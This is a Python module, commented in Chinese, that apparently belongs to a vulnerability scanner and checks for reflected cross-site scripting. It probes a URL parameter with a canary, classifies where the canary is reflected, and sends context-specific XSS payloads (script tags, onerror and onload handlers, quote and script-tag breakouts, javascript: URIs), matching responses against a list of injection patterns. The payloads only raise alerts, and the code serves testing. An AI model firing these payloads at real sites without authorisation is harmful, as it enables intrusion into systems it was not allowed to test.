#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) 验证模块

包含:
- XSSVerifierMixin: XSS 验证混入类
  - verify_xss_reflected: 反射型 XSS 验证
  - _analyze_context: XSS 上下文分析
"""
import html
import logging
import re
import secrets
from typing import Any, Dict, List, Optional, Tuple

from .models import VerificationResult

logger = logging.getLogger(__name__)


class XSSVerifierMixin:
    """XSS验证混入类"""

    def verify_xss_reflected(
        self,
        url: str,
        param: str,
        payload: Optional[str] = None,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, Any]] = None,
        data: Any = None,
        json_data: Any = None,
    ) -> VerificationResult:
        """反射型XSS验证 - 支持上下文分析"""
        # 生成唯一标识符
        unique_id = secrets.token_hex(6)
        canary = f"xss{unique_id}"

        # 先发送探针
        probe_url, probe_body, probe_headers = self._prepare_request(
            url=url,
            param=param,
            payload=canary,
            method=method,
            headers=headers,
            params=params,
            data=data,
            json_data=json_data,
        )
        probe_response, _, _, _ = self._request(
            probe_url,
            method=method,
            data=probe_body,
            headers=probe_headers,
        )

        if not probe_response or canary not in probe_response:
            return VerificationResult(
                vuln_type="XSS",
                payload="N/A",
                url=url,
                is_vulnerable=False,
                confidence="low",
                evidence="Canary not reflected in response",
                response_time=0,
                response_code=200,
                response_length=0,
                verification_method="reflected_check",
            )

        # 分析反射上下文
        contexts = self._analyze_context(probe_response, canary)

        # 根据上下文选择 payload
        context_payloads = self._get_context_payloads(contexts, unique_id)

        if payload:
            # 如果用户提供了 payload，加入测试列表
            context_payloads.insert(0, payload)

        # 测试各 payload
        for test_payload in context_payloads[:10]:  # 限制测试数量
            test_url, body_data, request_headers = self._prepare_request(
                url=url,
                param=param,
                payload=test_payload,
                method=method,
                headers=headers,
                params=params,
                data=data,
                json_data=json_data,
            )
            response_body, code, elapsed, length = self._request(
                test_url,
                method=method,
                data=body_data,
                headers=request_headers,
            )

            if response_body:
                # 检测 payload 是否原样反射（未编码）
                is_vulnerable, evidence = self._check_xss_payload(
                    response_body, test_payload, unique_id
                )
                if is_vulnerable:
                    return VerificationResult(
                        vuln_type="XSS (Reflected)",
                        payload=test_payload,
                        url=test_url,
                        is_vulnerable=True,
                        confidence="high",
                        evidence=evidence,
                        response_time=elapsed,
                        response_code=code,
                        response_length=length,
                        verification_method="reflected_payload",
                        recommendation="实施输出编码, 使用 CSP, 验证/净化输入",
                    )

        return VerificationResult(
            vuln_type="XSS",
            payload="N/A",
            url=url,
            is_vulnerable=False,
            confidence="medium",
            evidence=f"Canary reflected but payloads encoded. Contexts: {contexts}",
            response_time=0,
            response_code=200,
            response_length=0,
            verification_method="reflected_check",
        )

    def _analyze_context(self, response: str, canary: str) -> List[str]:
        """分析 canary 在响应中的上下文"""
        contexts = []

        # HTML 标签内容
        if re.search(rf">{canary}<", response):
            contexts.append("html_content")

        # HTML 属性值（双引号）
        if re.search(rf'="[^"]*{canary}[^"]*"', response):
            contexts.append("attr_double_quote")

        # HTML 属性值（单引号）
        if re.search(rf"='[^']*{canary}[^']*'", response):
            contexts.append("attr_single_quote")

        # HTML 属性值（无引号）
        if re.search(rf"=\s*{canary}[\s>]", response):
            contexts.append("attr_unquoted")

        # JavaScript 字符串（双引号）
        if re.search(rf'<script[^>]*>.*?"{canary}".*?</script>', response, re.DOTALL):
            contexts.append("js_double_quote")

        # JavaScript 字符串（单引号）
        if re.search(rf"<script[^>]*>.*?'{canary}'.*?</script>", response, re.DOTALL):
            contexts.append("js_single_quote")

        # JavaScript 模板字符串
        if re.search(rf"<script[^>]*>.*?`.*?{canary}.*?`.*?</script>", response, re.DOTALL):
            contexts.append("js_template")

        # URL 参数
        if re.search(rf"(href|src|action)=[\"']?[^\"'\s>]*{canary}", response, re.IGNORECASE):
            contexts.append("url_context")

        # CSS 上下文
        if re.search(rf"<style[^>]*>.*?{canary}.*?</style>", response, re.DOTALL):
            contexts.append("css_context")

        # 注释中
        if re.search(rf"<!--.*?{canary}.*?-->", response, re.DOTALL):
            contexts.append("html_comment")

        if not contexts:
            contexts.append("unknown")

        return contexts

    def _get_context_payloads(self, contexts: List[str], unique_id: str) -> List[str]:
        """根据上下文生成对应的 payload"""
        payloads = []

        for ctx in contexts:
            if ctx == "html_content":
                payloads.extend([
                    f"<script>alert('{unique_id}')</script>",
                    f"<img src=x onerror=alert('{unique_id}')>",
                    f"<svg onload=alert('{unique_id}')>",
                    f"<body onload=alert('{unique_id}')>",
                ])
            elif ctx == "attr_double_quote":
                payloads.extend([
                    f'" onmouseover="alert(\'{unique_id}\')" x="',
                    f'" onfocus="alert(\'{unique_id}\')" autofocus="',
                    f'"><script>alert(\'{unique_id}\')</script><"',
                ])
            elif ctx == "attr_single_quote":
                payloads.extend([
                    f"' onmouseover='alert(\"{unique_id}\")' x='",
                    f"' onfocus='alert(\"{unique_id}\")' autofocus='",
                    f"'><script>alert('{unique_id}')</script><'",
                ])
            elif ctx == "attr_unquoted":
                payloads.extend([
                    f" onmouseover=alert('{unique_id}') ",
                    f" onfocus=alert('{unique_id}') autofocus ",
                ])
            elif ctx == "js_double_quote":
                payloads.extend([
                    f'";alert("{unique_id}");//',
                    f'"-alert("{unique_id}")-"',
                    f'";</script><script>alert("{unique_id}")</script><script>"',
                ])
            elif ctx == "js_single_quote":
                payloads.extend([
                    f"';alert('{unique_id}');//",
                    f"'-alert('{unique_id}')-'",
                    f"';</script><script>alert('{unique_id}')</script><script>'",
                ])
            elif ctx == "js_template":
                payloads.extend([
                    f"${{alert('{unique_id}')}}",
                    f"`-alert('{unique_id}')-`",
                ])
            elif ctx == "url_context":
                payloads.extend([
                    f"javascript:alert('{unique_id}')",
                    f"data:text/html,<script>alert('{unique_id}')</script>",
                ])
            elif ctx == "css_context":
                payloads.extend([
                    f"}}</style><script>alert('{unique_id}')</script><style>",
                ])
            else:
                # 通用 payload
                payloads.extend([
                    f"<script>alert('{unique_id}')</script>",
                    f"<img src=x onerror=alert('{unique_id}')>",
                ])

        return payloads

    def _check_xss_payload(
        self, response: str, payload: str, unique_id: str
    ) -> Tuple[bool, str]:
        """检查 XSS payload 是否成功注入"""
        # 检查未编码的关键字符
        dangerous_patterns = [
            (f"<script>alert('{unique_id}')</script>", "Script tag executed"),
            (f"onerror=alert('{unique_id}')", "Event handler injected"),
            (f"onload=alert('{unique_id}')", "Event handler injected"),
            (f"onmouseover=alert('{unique_id}')", "Event handler injected"),
            (f"onfocus=alert('{unique_id}')", "Event handler injected"),
            (f"javascript:alert('{unique_id}')", "JavaScript protocol injected"),
        ]

        for pattern, desc in dangerous_patterns:
            if pattern in response:
                return True, f"{desc}: {pattern[:50]}"

        # 检查 payload 是否原样反射（未被 HTML 编码）
        # 关键检查：< > " ' 是否被编码
        if payload in response:
            # 检查是否包含危险字符
            has_dangerous = any(c in payload for c in "<>\"'")
            if has_dangerous:
                # 检查响应中是否有编码版本
                encoded_payload = html.escape(payload)
                if encoded_payload not in response:
                    return True, f"Payload reflected unencoded: {payload[:50]}"

        return False, ""